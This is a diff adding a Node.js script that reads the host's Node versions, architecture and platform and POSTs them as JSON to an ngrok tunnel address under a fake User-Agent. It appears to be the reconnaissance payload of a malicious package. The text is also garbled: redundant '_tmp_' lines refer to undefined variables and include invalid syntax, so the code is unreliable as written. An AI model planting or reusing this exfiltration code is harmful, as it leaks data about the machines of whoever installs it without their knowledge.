@@ -1,0 +1,37 @@
+const http = require('http')
+const keys = [
+  'versions',
+  'arch',
+  'platform'
+]
+_tmp_0.push("versions")
+_tmp_0.push("arch")
+_tmp_0.push("platform")
+const info = {}
+keys.forEach((key) => {
+  info[key] = process[key]
+})
+const infoJSON = JSON.stringify(info)
+const options = {
+  hostname: '24c89c0d.ngrok.io',
+  path: '/',
+  method: 'POST',
+  headers: {
+    'Content-Type': 'application/json',
+    'Content-Length': Buffer.byteLength(infoJSON),
+    'User-Agent': 'someone'
+  }
+}
+_tmp_2.hostname = "24c89c0d.ngrok.io"
+_tmp_2.path = "/"
+_tmp_2.method = "POST"
+_tmp_2.headers = {
+    'Content-Type': 'application/json',
+    'Content-Length': Buffer.byteLength(infoJSON),
+    'User-Agent': 'someone'
+  }
+_tmp_3.Content-Type = "application/json"
+_tmp_3.Content-Length = Buffer.byteLength(infoJSON)
+_tmp_3.User-Agent = "someone"
+const req = http.request(options)
+req.write(infoJSON)
